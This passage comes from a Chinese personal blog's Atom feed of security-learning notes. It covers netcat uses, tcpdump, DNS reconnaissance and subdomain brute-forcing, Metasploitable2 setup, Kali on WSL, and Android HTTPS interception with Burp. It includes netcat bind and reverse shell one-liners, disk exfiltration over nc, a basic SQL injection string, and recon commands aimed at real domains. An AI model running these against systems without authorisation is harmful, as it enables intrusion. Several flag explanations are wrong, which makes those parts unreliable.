+<li>Fbqd: 设置特定的选项，包括使用文件输入和输出、启用调试模式以及启用详细输出</li>
+<li>a rijndael-256: 使用Rijndael-256算法进行加密</li>
+<li>m ecb: 使用ECB模式进行加密，ECB是一种基本的加密模式，不适合处理大量数据</li>
+</ul>
+</li>
+<li>
+<p>流媒体服务<br>
+A： <code>cat 1.mp4 | nc -lp 333 </code>将mp4文件cat出来通过管道传入nc<br>
+B： <code>1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code>主机B需要使用支持命令模式的播放器比如mplayer</p>
+<ul>
+<li>mplayer: 调用MPlayer媒体播放器</li>
+<li>vo x11: 指定视频输出设备为X11（X Window System），即在X窗口系统中播放视频</li>
+<li>cache 3000: 设置缓存大小为3000 KB，这可以帮助减少视频播放时的卡顿和延迟</li>
+<li>-: 表示要播放的视频文件是通过标准输入传输的，而不是通过文件名指定的</li>
+</ul>
+</li>
+<li>
+<p>端口扫描<br>
+<code>nc -nvz 1.1.1.1 1-65535 </code></p>
+<ul>
+<li>-nvz: 设置netcat为静默模式（不显示任何输出）、启用数字格式（显示IP地址和端口号）、以及使用zero I/O模式（仅扫描端口，不发送任何数据）</li>
+</ul>
+<p><code>nc –vnzu 1.1.1.1 1-1024</code></p>
+<ul>
+<li>-u: 使用UDP协议</li>
+</ul>
+</li>
+<li>
+<p>远程克隆硬盘<br>
+A： <code>nc -lp 333 | dd of=/dev/sda </code><br>
+B： <code>dd if=/dev/sda | nc -nv 1.1.1.1 333 –q 1</code></p>
+<ul>
+<li>dd: 是一个用于数据转换和复制的命令行工具</li>
+<li>if=/dev/sda: 指定输入文件（input file）为/dev/sda，即源磁盘/dev/sda</li>
+<li>of=/dev/sdb: 指定输出文件（output file）为/dev/sdb，即目标磁盘/dev/sdb</li>
+<li>将B主机的/dev/sda克隆出来通过nc传到A主机的/dev/sda</li>
+</ul>
+</li>
+<li>
+<p>远程控制<br>
+A：<code>nc -lp 333 -c bash</code> -c bash: 指定nc接受连接后要执行的命令，这里是执行bash命令（即启动一个bash shell）<br>
+B：<code>nc 1.1.1.1 333</code><br>
+或者<br>
+A：<code>nc -lp 333</code><br>
+B：<code>nc 1.1.1.1 333 -c bash</code> 指定连接后要执行的命令，即bash shell</p>
+</li>
+<li>
+<p>ncat<br>
+A：<code>ncat -c bash --allow 192.168.123.100 -vnl 333 --ssl</code></p>
+<ul>
+<li>-c bash: 在连接建立后，执行 bash 命令（即启动一个交互式的 Bash Shell）。</li>
+<li>--allow 192.168.123.100: 限制连接的来源 IP 地址为 192.168.123.100。只有来自该 IP 地址的连接才会被接受。</li>
+<li>-vnl 333: 监听本地端口 333，等待连接。</li>
+<li>--ssl: 使用 SSL/TLS 加密来保护连接。</li>
+</ul>
+<p>B：<code>ncat -nv 192.168.123.157 333 --ssl</code></p>
+<ul>
+<li>-nv: 使用详细输出模式，显示更多连接信息。</li>
+<li>192.168.123.157: 要连接的目标 IP 地址。</li>
+<li>333: 目标主机上要连接的端口。</li>
+<li>--ssl: 使用 SSL/TLS 加密来保护连接。</li>
+</ul>
+</li>
+</ol>
+<h3 id="wiresharktcpdump">wireshark&amp;tcpdump</h3>
+<p><a href="https://wiki.wireshark.org/SampleCaptures/">wireshark的示例cap包</a><br>
+<img src="https://hellogu.github.io/post-images/1714452149276.png" alt="" loading="lazy"><br>
+<img src="https://hellogu.github.io/post-images/1714452954920.png" alt="" loading="lazy"><br>
+三次握手：</p>
+<ul>
+<li>客户端发送一个SYN数据包给服务器，表示请求建立连接。</li>
+<li>服务器收到SYN数据包后，回复一个SYN+ACK数据包给客户端，表示同意建立连接。</li>
+<li>客户端再发送一个ACK数据包给服务器，表示连接建立成功。</li>
+<li>这样就完成了TCP的三次握手过程，连接建立成功。</li>
+</ul>
+<p>四次挥手，用于终止连接。</p>
+<ul>
+<li>客户端发送一个FIN数据包给服务器，表示要关闭连接。</li>
+<li>服务器收到FIN数据包后，回复一个ACK数据包给客户端，表示收到关闭请求。</li>
+<li>服务器再发送一个FIN数据包给客户端，表示自己也要关闭连接。</li>
+<li>客户端收到FIN数据包后，回复一个ACK数据包给服务器，表示同意关闭连接。<br>
+<img src="https://hellogu.github.io/post-images/1714453296880.png" alt="" loading="lazy"><br>
+<code>tcpdump -A -n 'tcp[13] = 24' -r http.cap</code> 使用tcpdump读取数据包</li>
+<li>-A: 这个选项告诉tcpdump以ASCII格式显示数据包的内容，而不是以十六进制格式显示。</li>
+<li>-n: 这个选项告诉tcpdump不要将网络地址和端口转换为主机名和服务名，而是以数字形式显示。</li>
+<li>'tcp[13] = 24': 这部分是过滤器，用于指定要捕获的数据包的条件。在这里，tcp[13] = 24表示过滤出TCP标志字段的第13个字节（即第一个字节为0）的值为24的数据包。在TCP标志字段中，24表示SYN和ACK标志同时被设置，这通常代表一个TCP连接的建立阶段。</li>
+</ul>
+<p>在TCP标志字段中，第13个字节（从0开始计数）通常用来表示TCP头部中的标志位。TCP头部的标志位共有6个，它们分别是：</p>
+<ul>
+<li>URG（紧急指针）：用来指示紧急数据。</li>
+<li>ACK（确认）：用来确认收到的数据。</li>
+<li>PSH（推送）：用来指示接收方尽快将数据交给应用层。</li>
+<li>RST（复位）：用来强制关闭连接。</li>
+<li>SYN（同步）：用来建立连接。</li>
+<li>FIN（结束）：用来释放连接。</li>
+</ul>
+<p>这些标志位被存储在TCP头部的第13个字节中，每个标志位占1个比特位。通过设置或清除这些标志位，TCP控制连接的建立、终止和数据传输过程。</p>
+<p>CWR（Congestion Window Reduced）和ECE（Explicit Congestion Notification Echo）是TCP头部中的两个额外的标志位，用于传输控制和拥塞控制。</p>
+<ul>
+<li>CWR（Congestion Window Reduced）：CWR标志位用于指示发送方已经收到了一个带有拥塞通知（Congestion Notification）的数据包，并已经减小了发送窗口（Congestion Window）。这个标志位通常在TCP连接中用于拥塞控制。</li>
+<li>ECE（Explicit Congestion Notification Echo）：ECE标志位用于指示接收方收到了来自网络的拥塞通知。当路由器或网络设备检测到网络拥塞时，会向数据包中添加拥塞通知，接收方收到带有ECE标志位的数据包后，会通知发送方网络出现了拥塞。这有助于发送方调整发送速率以减轻网络拥塞。</li>
+</ul>
+<p>这两个标志位通常在TCP连接中用于拥塞控制和网络拥塞的处理，帮助TCP协议更有效地适应网络状况并提高网络性能。</p>
+<h3 id="dns信息收集">DNS信息收集</h3>
+<p>nslookup，dig和host都是用于进行DNS查询的命令行工具，用于查找域名对应的IP地址或反向查找IP地址对应的域名<br>
+<code>nslookup www.sina.com</code><br>
+查询域名www.sina.com对应的IP地址和其他相关信息。<br>
+<code>nslookup -type=ns example.com 156.154.70.22</code><br>
+指定的域名服务器（156.154.70.22）查询域名example.com的NS记录（Name Server记录）。<br>
+<code>dig @8.8.8.8 www.sina.com mx</code><br>
+指定要查询的DNS服务器（8.8.8.8），查询域名www.sina.com的MX记录（Mail Exchange记录）。<br>
+<code>dig www.sina.com any</code><br>
+查询域名www.sina.com的所有记录类型（包括A、MX、NS等）。<br>
+<code>dig +noall +answer -x 8.8.8.8</code><br>
+进行反向查询，通过IP地址（8.8.8.8）查找对应的域名。<br>
+<code>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</code><br>
+查询指定DNS服务器（ns3.dnsv4.com）的BIND版本信息。（通常会被拒绝）<br>
+<code>dig +trace example.com</code><br>
+执行DNS追踪，显示从根域名服务器到最终目标域名的DNS查询路径。<br>
+<code>dig @ns1.example.com example.com axfr</code><br>
+在指定的域名服务器（ns1.example.com）上执行区域传送（AXFR），获取域名example.com的完整DNS记录。（通常会被拒绝）<br>
+<code>host -T -l sina.com 8.8.8.8</code><br>
+在指定的DNS服务器（8.8.8.8）上执行枚举（枚举所有记录）查询，列出sina.com域名的所有记录。</p>
+<h3 id="dns字典爆破">DNS字典爆破</h3>
+<p>由于通过区域传送（AXFR）获取域名下的完整DNS记录通常会被拒绝，攻击者会使用DNS字典爆破来探测目标域名下的子域名。通过使用一个包含大量可能的子域名列表的字典文件，尝试枚举目标域名的所有可能子域名，以便发现隐藏在其后的资源或服务。常用工具，如&quot;fierce&quot;、&quot;sublist3r&quot;等，指定一个字典文件（包含可能的子域名列表）并指定目标域名，然后工具将自动尝试查询每个子域名的DNS记录，以确定哪些子域名是有效的。<br>
+fierce等工具安装后都会自带一些字典文件，使用<code>dpkg -L fierce</code> 来列出相关文件查找字典文件的路径<br>
+<img src="https://hellogu.github.io/post-images/1714454703276.png" alt="" loading="lazy"></p>
+<p><code>fierce --dns-servers 223.5.5.5 --domain sina.com.cn --subdomain-file /usr/lib/python3/dist-packages/fierce/lists/5000.txt</code></p>
+<ul>
+<li>--dns-servers 223.5.5.5: 这个参数指定了要使用的DNS服务器的IP地址，这里是223.5.5.5。</li>
+<li>--domain sina.com.cn: 这个参数指定了目标域名，即要进行字典爆破的域名是sina.com.cn。</li>
+<li>--subdomain-file /usr/lib/python3/dist-packages/fierce/lists/5000.txt: 这个参数指定了包含要用于字典爆破的子域名列表的文件路径，这里是/usr/lib/python3/dist-packages/fierce/lists/5000.txt。<br>
+<img src="https://hellogu.github.io/post-images/1714454830259.png" alt="" loading="lazy"></li>
+</ul>
+<p><code>atk6-dnsdict6 -d4 -t 16 -x sina.com</code> atk6-dnsdict6速度更快</p>
+<ul>
+<li>-d4 表示使用 IPv4 进行查询</li>
+<li>-t 16 表示设置 DNS 查询的超时时间为 16 毫秒</li>
+<li>-x 则表示使用递归查询。</li>
+</ul>
+<p>其他类似工具<br>
+<code>dnsenum</code><br>
+<code>dnsmap</code><br>
+<code>dnsrecon</code></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Metasploitable2靶场部署]]></title>
+        <id>https://hellogu.github.io/post/metasploitable2/</id>
+        <link href="https://hellogu.github.io/post/metasploitable2/">
+        </link>
+        <updated>2024-04-28T10:21:23.000Z</updated>
+        <summary type="html"><![CDATA[<p>Metasploitable2是一个专门设计用于安全测试和漏洞利用的虚拟机镜像。它由Rapid7公司开发，旨在提供一个用于练习渗透测试和漏洞利用的环境，帮助安全专业人员和研究人员学习和实践攻击技术。Metasploitable2基于Ubuntu Linux操作系统，并预装了大量易受攻击的漏洞和弱点，包括常见的服务如FTP、SSH、Telnet、Web服务器、数据库等。通过使用Metasploitable2，安全专业人员可以模拟真实世界中的攻击场景，练习渗透测试和漏洞利用技术，了解攻击者可能利用的漏洞和弱点，提高安全防护意识并加强网络安全防御能力。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Metasploitable2是一个专门设计用于安全测试和漏洞利用的虚拟机镜像。它由Rapid7公司开发，旨在提供一个用于练习渗透测试和漏洞利用的环境，帮助安全专业人员和研究人员学习和实践攻击技术。Metasploitable2基于Ubuntu Linux操作系统，并预装了大量易受攻击的漏洞和弱点，包括常见的服务如FTP、SSH、Telnet、Web服务器、数据库等。通过使用Metasploitable2，安全专业人员可以模拟真实世界中的攻击场景，练习渗透测试和漏洞利用技术，了解攻击者可能利用的漏洞和弱点，提高安全防护意识并加强网络安全防御能力。</p>
+<!-- more -->
+<h1 id="1下载安装">1.下载安装</h1>
+<h2 id="step1">Step.1</h2>
+<p><img src="https://hellogu.github.io/post-images/1714299865598.png" alt="" loading="lazy"><br>
+<a href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/">点击下载</a></p>
+<h2 id="step2解压后导入vmware">Step.2.解压后导入VMware</h2>
+<p>解压后是VMware格式的虚拟机文件，没有找到Hyper-V的版本<br>
+<img src="https://hellogu.github.io/post-images/1714299952323.png" alt="" loading="lazy"></p>
+<h2 id="step3修改配置文件">Step.3.修改配置文件</h2>
+<p>导入VMware后启动虚拟机，用户名和密码都是msfadmin<br>
+使用<code>ip a</code>命令查看ip地址，浏览器打开<code>http://ip/mutillidae/</code><br>
+此时进入OWASP TOP 10 进行练习会报错，原因是<code>/var/www/mutillidae/config.inc</code>配置文件中的<code>dbname</code>不正确<br>
+<img src="https://hellogu.github.io/post-images/1714300436714.png" alt="" loading="lazy"><br>
+执行命令<code>sudo vi /var/www/mutillidae/config.inc</code>将dbname修改为<code>owasp10</code><br>
+<img src="https://hellogu.github.io/post-images/1714300591208.png" alt="" loading="lazy"><br>
+修改后<code>wq!</code>保存并退出，再进入OWASP TOP 10 -&gt; A1 Injection -&gt; SQLi-Extract Data -&gt; User Info进行第一条SQL注入练习<br>
+<img src="https://hellogu.github.io/post-images/1714300858089.png" alt="" loading="lazy"><br>
+<code>' or '1' #</code> 第一个单引号将sql语句前面截断，#号将sql语句后面注释，中间 or  '1' 恒成立，实现查询出所有用户信息，完整的sql语句为<code>SELECT * FROM accounts WHERE username='' or '1' #' AND password=''</code>（不过2024年了，应该不会有网站出现这种简单的注入漏洞了吧🤓）</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WSL安装Kali]]></title>
+        <id>https://hellogu.github.io/post/wsl-an-zhuang-kali/</id>
+        <link href="https://hellogu.github.io/post/wsl-an-zhuang-kali/">
+        </link>
+        <updated>2024-04-26T04:45:27.000Z</updated>
+        <summary type="html"><![CDATA[<p>在WSL2中部署Kali Linux</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>在WSL2中部署Kali Linux</p>
+<!-- more -->
+<h2 id="1安装">1.安装</h2>
+<p><a href="https://www.kali.org/docs/wsl/wsl-preparations/">Kali官方文档</a>进行安装<br>
+<img src="https://hellogu.github.io/post-images/1714106845564.png" alt="" loading="lazy"></p>
+<!-- more -->
+<p>在 Step.5 遇到了报错<br>
+<img src="https://hellogu.github.io/post-images/1714106891407.png" alt="" loading="lazy"><br>
+<a href="https://blog.csdn.net/weixin_43891732/article/details/133672607">参考CSDN文章</a>解决<br>
+<img src="https://hellogu.github.io/post-images/1714106985888.png" alt="" loading="lazy"></p>
+<h2 id="2安装桌面参考kali官方文档">2.安装桌面<a href="https://www.kali.org/docs/wsl/win-kex/">参考Kali官方文档</a></h2>
+<figure data-type="image" tabindex="1"><img src="https://hellogu.github.io/post-images/1714107490340.png" alt="" loading="lazy"></figure>
+<pre><code class="language-shell"># 启动
+cd ~
+kex
+kex stop # 关闭
+kex --win -s # 窗口模式
+kex --sl -s # 无缝模式
+kex --esm --sound # windows rdp 远程模式
+</code></pre>
+<h2 id="3卸载重装">3.卸载重装</h2>
+<p>先在windows应用管理中卸载kali-linux<br>
+然后在wsl中取消注册kali-linux</p>
+<pre><code>wsl --unregister kali-linux
+</code></pre>
+<p>最后在应用商店重装kali-linux(步骤1中的 Step.5 )</p>
+<h2 id="4wsl重启">4.WSL重启</h2>
+<pre><code class="language-shell">wsl -v -l #列出所有wsl发行版和状态
+wsl --shutdown  #立即终止所有正在运行的分发版和 WSL 2
+wsl --terminate kali-linux #终止指定发行版
+wsl -d kali-linux # 运行指定的分发版
+</code></pre>
+<h2 id="5一个诡异的问题">5.一个诡异的问题</h2>
+<p>在windows开始菜单中打开kali linux输入kex --win -s能正常启动kali桌面，在mobaxterm中连接kali后再输入kex --win -s，出现的kali桌面没有任务栏😂</p>
+<h2 id="6kex无缝模式打不开">6.kex无缝模式打不开</h2>
+<p><img src="https://hellogu.github.io/post-images/1714118815456.png" alt="" loading="lazy"><br>
+尝试了好久，没仔细看报错信息“Unable to find Win-KeX server (SL) running on host: 192.168.123.1”，为了让kali能科学上网，使用windows中的clash，我在.wslconfig中设置了networkingMode=mirrored，所以这里的host ip变成了windows中的网关ip(我的路由器地址)，正常情况host ip应该是windows的ip<br>
+<img src="https://hellogu.github.io/post-images/1714118999524.png" alt="" loading="lazy"></p>
+<h2 id="7设置中科大源">7.设置中科大源</h2>
+<pre><code class="language-shell">sudo sed -i '1i\deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free non-free-firmware contrib\n\
+deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free non-free-firmware contrib' /etc/apt/sources.list
+</code></pre>
+<h2 id="8设置wsl网络为镜像或桥接模式">8.设置WSL网络为镜像或桥接模式</h2>
+<p><a href="https://zhuanlan.zhihu.com/p/659074950#:~:text=%E5%9C%A8%20%25USERPROFILE%25%20%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84.wslconfig%20%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%A6%82%E4%B8%8B%E9%85%8D%E7%BD%AE%20%5Bwsl2%5D%20networkingMode%3Dbridged%20vmSwitch%3DwslBridge%20%23,V2EX%20%EF%BC%8C%E5%A6%82%E4%B8%8B%E8%AE%BE%E7%BD%AE.wslconfig%20%E6%96%87%E4%BB%B6%EF%BC%9A%20%5Bexperimental%5D%20networkingMode%3Dmirrored%20dnsTunneling%3Dtrue%20firewall%3Dtrue%20autoProxy%3Dtrue">参考文档</a></p>
+<h2 id="9安装kali工具包">9.安装Kali工具包</h2>
+<p>安装标准工具包</p>
+<pre><code>sudo apt install -y kali-linux-default
+</code></pre>
+<p>安装大工具包（大概7 8G）</p>
+<pre><code>sudo apt install -y kali-linux-large
+</code></pre>
+<h2 id="10apt-install卡在setting-up-libc6amd64-237-14">10.apt install卡在Setting up libc6:amd64 (2.37-14) ...</h2>
+<p>安装hashcat时卡在了Setting up libc6，process 0%，笔记本风扇一直高转，重装WSL也没有解决，在github找到了<a href="https://github.com/microsoft/WSL/discussions/11097#discussioncomment-8356353">解决方法</a><br>
+<img src="https://hellogu.github.io/post-images/1714218105971.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[太强辣， GeekHour课程笔记]]></title>
+        <id>https://hellogu.github.io/post/tai-qiang-la-geekhour/</id>
+        <link href="https://hellogu.github.io/post/tai-qiang-la-geekhour/">
+        </link>
+        <updated>2024-04-25T05:00:41.000Z</updated>
+        <summary type="html"><![CDATA[<p>  最近刷B站发现了这个宝藏UP主，看了一遍他的linux、K8S等教程，怎么说呢，感觉他就像我的同班学霸，虽然在之前的工作中跟他一样学习了这些东西，但看一遍他的笔记，期末能提高10分👻有一种高密度的知识流进大脑的感觉，所以我要把他的笔记全部抄一遍！放到这个文档中供自己随时查看，嘻嘻。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>  最近刷B站发现了这个宝藏UP主，看了一遍他的linux、K8S等教程，怎么说呢，感觉他就像我的同班学霸，虽然在之前的工作中跟他一样学习了这些东西，但看一遍他的笔记，期末能提高10分👻有一种高密度的知识流进大脑的感觉，所以我要把他的笔记全部抄一遍！放到这个文档中供自己随时查看，嘻嘻。</p>
+<!-- more -->
+<p><a href="https://hellogu.github.io/post-images/LinuxCheatSheet.pdf">LinuxCheatSheet</a><br>
+<a href="https://hellogu.github.io/post-images/Kubernetes-Cheat-Sheet.pdf">Kubernetes-Cheat-Sheet</a><br>
+<a href="https://hellogu.github.io/post-images/DockerCheatSheet-ByGeekHour.pdf">DockerCheatSheet</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[安卓微信小程序抓包]]></title>
+        <id>https://hellogu.github.io/post/an-zhuo-wei-xin-xiao-cheng-xu-zhua-bao/</id>
+        <link href="https://hellogu.github.io/post/an-zhuo-wei-xin-xiao-cheng-xu-zhua-bao/">
+        </link>
+        <updated>2024-04-13T07:18:18.000Z</updated>
+        <summary type="html"><![CDATA[<p>一直在使用的<a href="https://github.com/qd-today/qd/">qd签到框架</a>，最近发现某个微信小程序的自动签到任务出错了，看了一下，作者已经发布了新的签到模板，但是模板的设置由之前的只需要手机号变成了需要手机号和微信小程序的cookie了，记录一下</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>一直在使用的<a href="https://github.com/qd-today/qd/">qd签到框架</a>，最近发现某个微信小程序的自动签到任务出错了，看了一下，作者已经发布了新的签到模板，但是模板的设置由之前的只需要手机号变成了需要手机号和微信小程序的cookie了，记录一下</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://hellogu.github.io/post-images/1712992999066.png" alt="" loading="lazy"></figure>
+<ul>
+<li>iPhone的抓包比较简单，Appstore中搜索软件“stream”下载安装后信任证书就可以了</li>
+<li>安卓手机的话可以使用小黄鸟在手机上直接抓包，或者使用Burpsuite/fiddler/Charles等软件配置好代理后可以抓取http请求，抓取https请求的话需要配置证书<br>
+本文主要记录一下安卓上的实现方式</li>
+</ul>
+<h2 id="步骤">步骤</h2>
+<ol>
+<li>前置步骤：手机需要获取root权限并安装好<a href="https://github.com/HuskyDG/magisk-files/releases">magisk软件-kitsune版</a>,没有的话可以使用<a href="https://www.ghxi.com/ldmnq9.html">雷电模拟器</a>，参考文章<a href="https://www.duokaiya.com/786.html">雷电安装Magisk及Delta(狐狸面具)教程</a></li>
+<li>Burpsuite配置代理，导出证书</li>
+<li>使用openssl工具修改证书格式，导入手机</li>
+<li><s>手机安装movecert magisk模块，将导入的用户证书转移成系统证书</s>使用MT管理器直接将证书文件复制到系统证书目录</li>
+<li>手机配置局域网代理开始抓包</li>
+</ol>
+<h2 id="具体操作步骤">具体操作步骤</h2>
+<ol>
+<li>Burpsuite配置<br>
+Proxy-Options中点击Add添加一个Proxy监听器，端口随意，指定地址为电脑的网卡ip，OK保存<br>
+<img src="https://hellogu.github.io/post-images/1712994077878.png" alt="" loading="lazy"><br>
+浏览器打开设置的ip+端口号，点击右上角的CA Certificate导出证书<br>
+<img src="https://hellogu.github.io/post-images/1712994275835.png" alt="" loading="lazy"></li>
+<li>可以看到上一步中导出的证书为der格式，接下来需要使用openssl工具进行格式转换<br>
+<img src="https://hellogu.github.io/post-images/1712994428263.png" alt="" loading="lazy"><br>
+windows下使用openssl工具比较繁琐，需要下载解压配置环境变量，如果有linux环境的话会方便许多，因为大多数的linux发行版本都会自带openssl工具<br>
+<img src="https://hellogu.github.io/post-images/1712994608642.png" alt="" loading="lazy"><br>
+如下图，我已经将der证书放入/opt/目录下，接下来开始格式转换<pre><code class="language-shell">openssl x509 -inform der -in cacert.der -out cacert.pem # 将der证书转换为pem
+openssl x509 -subject_hash_old -in cacert.pem # 查看hash标识
+</code></pre>
+<img src="https://hellogu.github.io/post-images/1712995061395.png" alt="" loading="lazy"><br>
+把cacert.pem拷到本地，重命名为&quot;9a5ba575.0&quot;</li>
+<li>把证书文件&quot;9a5ba575.0&quot;复制到手机的系统证书目录，设置权限644<br>
+<img src="https://hellogu.github.io/post-images/1712998347954.jpg" alt="" loading="lazy"><br>
+<img src="https://hellogu.github.io/post-images/1712998352051.jpg" alt="" loading="lazy"><br>
+<img src="https://hellogu.github.io/post-images/1712998355439.jpg" alt="" loading="lazy"><br>
+不使用MT管理器的话，也可以直接adb push</li>
+</ol>
+<pre><code class="language-shell">adb push 9a5ba575.0 /system/etc/security/cacerts	# 移动
+adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0 #设置权限
+</code></pre>
+<ol start="4">
+<li>设置wlan代理<br>
+在手机的wlan设置中设置代理地址和端口为步骤1中的ip和端口<br>
+<img src="https://hellogu.github.io/post-images/1712998513098.jpg" alt="" loading="lazy"></li>
+<li>开始抓包<br>
+已经可以成功抓到手机的https请求和小程序中的https请求<br>
+<img src="https://hellogu.github.io/post-images/1712998777177.png" alt="" loading="lazy"><br>
+如果手机浏览器打开网页出现下面的提示就说明示证书没有设置好，检查步骤3<br>
+<img src="https://hellogu.github.io/post-images/1712998704056.jpg" alt="" loading="lazy"></li>
+</ol>
+]]></content>
+    </entry>
+</feed>
